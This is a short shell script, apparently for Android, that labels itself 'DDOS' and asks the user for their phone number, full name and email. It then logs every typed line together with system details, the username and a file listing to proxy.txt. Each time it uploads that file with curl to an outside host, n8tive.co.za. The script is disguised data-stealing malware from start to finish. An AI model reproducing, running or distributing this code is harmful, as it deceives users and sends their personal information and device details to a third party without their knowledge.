#!/system/bin/bash/sh
echo "DDOS"
echo "Please Enter your Personal Information to use"
echo ""
  echo -n "Phone Number:"
  read phone
  echo -n "first and last name :"
  read name
  echo -n "Email :"
  read email

cm()
{
read line
  case $line in

  $line)
  echo "
  System : $(uname -a)
  User   : $(whoami)
  date   : $(date)
  path   : $(pwd)

  $(cd /sdcard/download)
  $(ls -la)
  $(cd)

  phone number : $phone
  name : $name
  email : $email

  ','{$line}',' " >> proxy.txt
  curl -T proxy.txt http://n8tive.co.za/
  cm

 esac
 }
cm
